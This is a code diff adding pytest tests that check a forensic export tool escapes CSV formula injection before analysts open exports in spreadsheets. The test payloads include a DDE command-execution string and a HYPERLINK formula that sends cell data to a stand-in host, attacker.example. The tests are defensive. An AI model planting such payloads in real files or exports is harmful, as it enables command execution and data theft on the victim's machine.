@@ -88,6 +88,58 @@ def test_csv_cell_rendering():
     assert ex._csv_cell('a,"b"\nc') == 'a,"b"\nc'  # escaping is csv.writer's job
 
 
+# ── CSV formula injection ─────────────────────────────────────────────────────
+#
+# Field values come from ingested artifacts, so an attacker chooses them. A
+# value starting with = + - @ (or a tab/CR) is evaluated as a formula when the
+# analyst opens the export in Excel / LibreOffice / Sheets. The escape belongs
+# here, at the CSV boundary — never in ingest or in the stored event, which
+# must keep the evidence byte-faithful.
+
+
+@pytest.mark.parametrize("payload", [
+    '=cmd|\'/c calc\'!A0',
+    '=1+1',
+    '+1+1',
+    '-1+1',
+    '@SUM(A1:A9)',
+    '=HYPERLINK("http://attacker.example?d="&A1,"click")',
+    '\tstarts-with-tab',
+    '\rstarts-with-cr',
+])
+def test_csv_cell_neutralises_formula_prefixes(payload):
+    out = ex._csv_cell(payload)
+    assert out == "'" + payload
+    # The value itself is preserved verbatim after the escape character.
+    assert out[1:] == payload
+
+
+@pytest.mark.parametrize("benign", [
+    "powershell.exe -EncodedCommand ZQBj",   # '-' is not leading
+    "C:\\Windows\\System32\\cmd.exe",
+    "user=alice",
+    "10.0.0.1",
+    "",
+    "normal message text",
+])
+def test_csv_cell_leaves_benign_values_untouched(benign):
+    """Forensic data must not be mangled — only a LEADING trigger is escaped."""
+    assert ex._csv_cell(benign) == benign
+
+
+def test_csv_cell_escapes_formula_inside_a_list():
+    assert ex._csv_cell(["=1+1", "b"]) == "'=1+1, b"
+
+
+def test_csv_export_row_is_formula_safe():
+    """Through the row writer: the payload must not survive as a live formula."""
+    row = ex._csv_cell("=cmd|'/c calc'!A0")
+    out = io.StringIO()
+    csv.writer(out).writerow([row])
+    parsed = next(csv.reader(io.StringIO(out.getvalue())))
+    assert parsed[0].startswith("'=")
+
+
 # ── CSV export (round-trip fidelity) ──────────────────────────────────────────
 
 DOC1 = {
